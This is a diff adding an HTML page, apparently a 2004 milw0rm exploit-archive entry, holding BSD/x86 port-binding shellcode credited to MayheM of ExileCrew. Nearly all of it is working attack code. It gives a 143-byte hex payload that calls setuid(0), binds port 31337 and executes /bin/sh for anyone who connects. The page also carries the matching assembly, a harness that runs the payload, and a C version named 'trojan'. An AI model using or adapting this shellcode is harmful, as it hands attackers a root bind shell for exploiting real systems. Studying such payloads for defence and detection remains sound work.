@@ -1,0 +1,222 @@
+<html><head><title>bsd/x86 portbind port random 143 bytes</title></head><pre>Here is a BSD remote shellcode. 
+Tested on NetBSD . SHould work on FreeBSD and OpenBSD .
+
+by MayheM
+ExileCrew (www.exile2k.org)
+
+/*
+** 143 bytes
+*/
+char shellcode[] = 
+&quot;\x31\xC0&quot;
+&quot;\x50&quot;
+&quot;\x50&quot;
+&quot;\xB0\x17&quot;
+&quot;\xCD\x80&quot;      // setuid
+&quot;\x31\xC0&quot;
+&quot;\x50&quot;
+&quot;\x50&quot;
+&quot;\xB0\xB5&quot;
+&quot;\xCD\x80&quot;      // setgid
+&quot;\xEB\x60&quot;
+&quot;\x5E&quot;
+&quot;\x31\xC0&quot;
+&quot;\x89\x46\x04&quot;
+&quot;\x88\x46\x17&quot;
+&quot;\x6A\x06&quot;
+&quot;\x6A\x01&quot;
+&quot;\x6A\x02&quot;
+&quot;\xb0\x61&quot;
+&quot;\x50&quot;
+&quot;\xCD\x80&quot;      // socket
+&quot;\x89\xc7&quot;
+&quot;\x31\xc0&quot;
+&quot;\x6a\x10&quot;
+&quot;\x56&quot;
+&quot;\x57&quot;
+&quot;\xb0\x68&quot;
+&quot;\x50&quot;
+&quot;\xCD\x80&quot;      // bind
+&quot;\x6A\x01&quot;
+&quot;\x57&quot;
+&quot;\xb0\x6A&quot;
+&quot;\x50&quot;
+&quot;\xCD\x80&quot;      // listen
+&quot;\x50&quot;
+&quot;\x50&quot;
+&quot;\x57&quot;
+&quot;\xB0\x1E&quot;
+&quot;\x50&quot;
+&quot;\xCD\x80&quot;      //accept
+&quot;\x89\xc7&quot;
+&quot;\x31\xDB&quot;
+&quot;\x31\xc9&quot;
+&quot;\xb1\x03&quot;
+&quot;\x49&quot;
+&quot;\x31\xc0&quot;
+&quot;\xb0\x5A&quot;
+&quot;\x51&quot;
+&quot;\x57&quot;
+&quot;\x50&quot;
+&quot;\xcd\x80&quot;      // dup2
+&quot;\x39\xd9&quot;
+&quot;\x75\xf2&quot;
+&quot;\x31\xc0&quot;
+&quot;\x89\x76\x18&quot;
+&quot;\x89\x46\x1c&quot;
+&quot;\x8D\x56\x1c&quot;
+&quot;\x8D\x4E\x18&quot;
+&quot;\x83\xc6\x10&quot;
+&quot;\x52&quot;
+&quot;\x51&quot;
+&quot;\x56&quot;
+&quot;\xb0\x3b&quot;
+&quot;\x50&quot;
+&quot;\xcd\x80&quot;      // execve
+&quot;\xe8\x9b\xff\xff\xff&quot;
+&quot;\xc0\x02\x7a\x69\x90\x90\x90\x90\xc0\xd5\xbf\xef\xb8\xd5\xbf\xef&quot;
+&quot;/bin/sh&quot;;
+
+
+
+
+
+
+/*
+** ASM shellcode
+*/
+fct()
+{
+  __asm__(&quot;
+
+
+xorl  %eax, %eax
+pushl %eax
+pushl %eax
+movb  $0x17, %al
+int   $0x80 
+
+xorl  %eax, %eax
+pushl %eax
+pushl %eax
+movb  $0xB5, %al
+int   $0x80 
+
+
+
+jmp  data
+code:
+popl  %esi
+xorl  %eax, %eax
+movl  %eax, 0x04(%esi)
+movb  %al , 0x17(%esi)
+
+pushl $0x06
+pushl $0x01
+pushl $0x02
+movb  $0x61, %al
+pushl %eax
+int   $0x80
+
+movl  %eax, %edi
+xorl  %eax, %eax
+pushl $0x10
+pushl %esi
+pushl %edi
+movb  $0x68, %al
+pushl %eax
+int   $0x80
+
+pushl $0x01
+pushl %edi
+movb  $0x6A, %al
+pushl %eax
+int   $0x80
+
+pushl %eax
+pushl %eax
+pushl %edi
+movb  $0x1E, %al
+pushl %eax
+int   $0x80
+
+movl  %eax, %edi
+xorl  %ebx, %ebx
+xorl  %ecx, %ecx
+movb  $0x03, %ecx
+loop:
+decl  %ecx
+xorl  %eax, %eax
+movb  $0x5A, %al
+pushl %ecx
+pushl %edi
+pushl %eax
+int   $0x80
+cmpl  %ebx, %ecx
+jne   loop
+
+xorl  %eax, %eax
+movl  %esi, 0x18(%esi) 
+movl  %eax, 0x1C(%esi)
+leal  0x1C(%esi), %edx
+leal  0x18(%esi), %ecx
+addl  $0x10, %esi
+pushl %edx
+pushl %ecx
+pushl %esi
+movb  $0x3B, %al
+pushl %eax
+int   $0x80
+
+data:
+call  code
+.string \&quot;\xC0\x02\x7A\x69\x90\x90\x90\x90\xC0\xD5\xBF\xEF\xB8\xD5\xBF\xEF\&quot;
+.string \&quot;/bin/sh\x90\&quot;
+&quot;);
+}
+
+
+
+
+/*
+** Test
+*/
+main()
+{
+  void  (*fct)();
+  
+  printf(&quot;shellcode lenght = %d bytes \n&quot;, sizeof(shellcode));
+  fct = (void *) shellcode;
+  fct();
+}
+
+
+
+
+
+/*
+** C shellcode
+*/
+trojan()
+{
+  int                   clientsock;
+  int                   serversock;
+  char                  *server;
+  char                  *args[2];
+  
+  server = &quot;\xC0\x02\x7A\x69\x00\x00\x00\x00\xC0\xD5\xBF\xEF\xB8\xD5\xBF\xEF&quot;;
+  args[0] = &quot;/bin/sh&quot;;
+  args[1] = 0x00;
+  setuid(0);
+  setgid(0);
+  serversock = socket(0x02, 0x01, 0x06);
+  bind(serversock, server, 0x10);
+  listen(serversock, 0x01);
+  clientsock = accept(serversock, 0x00, 0x00);
+  dup2(clientsock, 0x02);
+  dup2(clientsock, 0x01);
+  dup2(clientsock, 0x00);
+  execve(args[0], args, args[1]);
+}
+
+// milw0rm.com [2004-09-26]</pre></html>
